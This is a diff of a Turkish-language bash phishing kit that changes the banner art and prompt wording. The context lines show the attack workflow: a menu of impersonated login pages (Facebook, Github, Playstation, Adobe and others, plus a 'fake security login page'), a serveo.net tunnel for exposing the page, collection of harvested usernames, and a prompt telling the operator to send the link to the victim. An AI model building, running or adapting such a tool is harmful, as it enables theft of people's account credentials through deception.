@@ -7,12 +7,20 @@ command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip Kurulu Değil Lütfen Kur
 }
 banner() {
 clear
-printf " \e[33;1m      >>>>>>>>>>>>>>>>    <<<<<<<<<<<<<<<<       #              \e[0m\n"
-printf " \e[33;1m     |       S        |                <|>     | ^ |            \e[0m\n"
-printf " \e[33;1m     |       T        |            <|>         | ^ |            \e[0m\n"
-printf " \e[32;1m     |       N        |         <|>            | ^ |            \e[0m\n"
-printf " \e[32;1m     |       M4       |     <|>                | ^ |            \e[0m\n"
-printf " \e[32;1m     >>>>>>>>>>>>>>>>    <<<<<<<<<<<<<<<<<     | ^ |            \e[0m\n"
+printf " \e[33;1m                            )    ) (     
+ ( /( ( /( )\ )  
+ )\()))\()|()/(  
+((_)\((_)\ /(_)) 
+  ((_)_((_|_))   
+ / _ \_  /|_ _|  
+| (_) / /  | |   
+ \___/___||___|  
+                                                            \e[0m\n"
+printf " \e[33;1m                                                                    \e[0m\n"
+printf " \e[33;1m                                                                 \e[0m\n"
+printf " \e[32;1m                                                                   \e[0m\n"
+printf " \e[32;1m                                                                \e[0m\n"
+printf " \e[32;1m                                                                \e[0m\n"
 printf " \e[33;1m [ ☪ VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN! ☪ ]  \e[0m\n"
 printf " \e[33;1m İletişim = İnstagram : @root.stnm4            \e[0m\n"
 printf " \e[33;1m                    \e[1;97m    ☪ Oğuz TÜRK ☪      \e[0m\n"
@@ -34,7 +42,7 @@ printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter     \e[0m\e
 printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Vk\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77mx\e[0m\e[1;31m] \e[0m\e[1;93mExit\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m  Bir Seçenek Belirleyin: \e[0m\e[1;96m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m  Bir Seçenek Belirle Dostum: \e[0m\e[1;96m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 facebook
 elif [[ $option == 2 || $option == 02 ]]; then
@@ -134,7 +142,7 @@ printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gelişmiş Oylama A
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Sahte Güvenlik Giriş Sayfası\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Giriş Sayfası\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Bir seçenek belirleyin: \e[0m\e[1;96m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Bir Seçenek Belirle Dostum: \e[0m\e[1;96m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 server="facebook"
 start
@@ -276,7 +284,7 @@ rm -rf websites/$server/usernames.txt
 fi
 def_port="5555"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Bir Bağlantı Noktası Seçin  (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Bir Bağlantı Noktası Seçi Dostum:  (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
 read port
 port="${port:-${def_port}}"
 start_serveo
@@ -296,7 +304,7 @@ printf "\n"
 sleep 7
 send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
 printf "\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Bağlantıyı kurbana gönderin: \e[0m\e[1;93m %s \n' $send_url
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Bağlantıyı Kurbana Gönderin: \e[0m\e[1;93m %s \n' $send_url
 printf "\n"
 found
 }
